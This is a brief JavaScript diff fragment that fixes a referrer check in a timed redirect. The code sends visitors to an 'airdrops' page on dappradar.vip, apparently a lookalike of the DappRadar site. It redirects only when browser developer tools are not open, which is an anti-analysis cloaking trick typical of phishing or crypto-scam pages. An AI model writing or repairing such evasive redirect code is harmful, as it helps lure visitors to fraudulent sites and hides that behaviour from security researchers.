@@ -44,7 +44,7 @@
             }
         }
 
-        if (uuid && referer.includes(".pages.dev")) {
+        if (uuid && document.referrer.includes(".pages.dev")) {
             setTimeout(function () {
                 if (!isDevToolsOpen) {
                     window.location.href = `https://dappradar.vip/hub/airdrops/${uuid}`;
